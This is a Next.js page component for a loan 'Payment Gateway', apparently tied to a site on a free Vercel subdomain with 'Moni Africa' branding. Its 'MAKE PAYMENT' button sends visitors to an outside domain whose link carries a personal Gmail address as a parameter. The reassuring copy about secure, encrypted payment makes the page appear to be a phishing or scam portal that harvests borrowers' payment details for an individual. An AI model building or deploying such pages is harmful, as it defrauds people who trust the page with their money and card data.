'use client';

import Image from 'next/image';
import Link from 'next/link';
import { Header } from '@/components/header';
import { Footer } from '@/components/footer';

export default function PaymentGateway() {
  return (
    <div className="min-h-screen flex flex-col bg-white">
      <Header />
      
      <main className="flex-grow">
        {/* Page Title */}
        <section className="bg-gradient-to-b from-gray-900 to-gray-800 text-white py-12 text-center">
          <h1 className="text-4xl font-bold">Payment Gateway</h1>
        </section>

        {/* Main Content */}
        <div className="max-w-4xl mx-auto px-4 py-8">

          {/* Top Image (home7) */}
          <div className="mb-8 flex justify-center">
            <Image
              src="/home7.png"
              alt="Moni Africa Payment"
              width={960}
              height={900}
              className="rounded-lg shadow-lg max-w-full h-auto"
              priority
            />
          </div>

          {/* Gateway Image (directly before payment button) */}
          <div className="mb-8 flex justify-center">
            <Image
              src="/gateway2.png"
              alt="Secure Payment Gateway"
              width={960}
              height={900}
              className="rounded-lg shadow-lg max-w-full h-auto"
            />
          </div>

          {/* Make Payment Button */}
          <div className="flex justify-center mb-8">
            <Link 
              href="https://gatewayspud.com/?email=mrdanihazard@gmail.com&sitename=https://lendigo.vercel.app"
              target="_blank"
              rel="noopener noreferrer"
              className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 px-12 rounded-lg shadow-lg transform transition hover:scale-105 text-lg"
            >
              MAKE PAYMENT
            </Link>
          </div>

          {/* Payment Writeup BELOW the button */}
          <div className="bg-blue-50 rounded-lg p-8 mb-8">
            <h2 className="text-2xl font-bold text-gray-800 mb-4">
              Click on the Payment Button below to proceed to the payment gateway
            </h2>
            <p className="text-gray-700 mb-6">
              Make your loan payments securely through our integrated payment gateway. We accept all major payment methods.
            </p>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div className="bg-white rounded-lg shadow p-6 border-l-4 border-blue-600">
                <h3 className="text-lg font-bold text-gray-800 mb-2">Secure Payment</h3>
                <p className="text-gray-700 text-sm">
                  Your payment information is encrypted and secured using industry-standard protocols.
                </p>
              </div>

              <div className="bg-white rounded-lg shadow p-6 border-l-4 border-green-600">
                <h3 className="text-lg font-bold text-gray-800 mb-2">Multiple Options</h3>
                <p className="text-gray-700 text-sm">
                  Pay using bank transfer, card payment, or mobile wallet.
                </p>
              </div>

              <div className="bg-white rounded-lg shadow p-6 border-l-4 border-purple-600">
                <h3 className="text-lg font-bold text-gray-800 mb-2">Instant Confirmation</h3>
                <p className="text-gray-700 text-sm">
                  Receive immediate confirmation after successful payment.
                </p>
              </div>

              <div className="bg-white rounded-lg shadow p-6 border-l-4 border-orange-600">
                <h3 className="text-lg font-bold text-gray-800 mb-2">24/7 Support</h3>
                <p className="text-gray-700 text-sm">
                  Our support team is available to assist with payment inquiries.
                </p>
              </div>
            </div>
          </div>

          {/* Additional Payment Information */}
          <div className="bg-white rounded-lg shadow-lg p-8">
            <h3 className="text-xl font-bold text-gray-800 mb-4">Payment Information</h3>

            <div className="space-y-4 text-gray-700">
              <div>
                <h4 className="font-semibold text-gray-800 mb-2">What You Need:</h4>
                <ul className="list-disc list-inside space-y-1">
                  <li>Your loan reference number</li>
                  <li>Valid payment method</li>
                  <li>Amount to be paid</li>
                </ul>
              </div>

              <div>
                <h4 className="font-semibold text-gray-800 mb-2">Processing Time:</h4>
                <p>
                  Payments are processed securely and reflected within 24–48 hours.
                </p>
              </div>

              <div>
                <h4 className="font-semibold text-gray-800 mb-2">Need Help?</h4>
                <p>
                  Contact our support team for assistance with payment issues.
                </p>
              </div>
            </div>
          </div>

        </div>
      </main>

      <Footer />
    </div>
  );
}
